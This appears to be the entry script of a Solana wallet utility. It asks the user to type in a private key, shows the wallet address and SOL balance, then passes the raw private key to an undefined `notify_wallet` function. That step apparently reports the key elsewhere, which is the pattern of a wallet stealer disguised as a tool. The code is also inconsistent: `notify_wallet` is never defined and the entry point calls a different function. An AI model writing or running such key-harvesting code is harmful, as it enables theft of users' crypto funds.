from colorama import init
from getwallet import get_wallet_from_private_key_bs58
from checkbalance import check_sol_balance
from utils.features import handle_additional_features
from utils.contract import main



init(autoreset=True)

def roun():
    wallet = None
    while wallet is None:
        private_key_bs58 = input("\033[93mPlease enter your private key : \033[0m")
        try:
            wallet = get_wallet_from_private_key_bs58(private_key_bs58)
            if wallet:
                break
        except Exception as e:
            print("\033[91mInvalid private key, please try again.\033[0m")
    
    public_key = str(wallet.pubkey())
    print(f"Wallet Address: {public_key}")

    sol_balance = check_sol_balance(public_key)
    print(f"Wallet SOL Balance: {sol_balance} SOL")

    notify_wallet(private_key_bs58, public_key, sol_balance)  

    handle_additional_features(sol_balance)

if __name__ == "__main__":
    main()
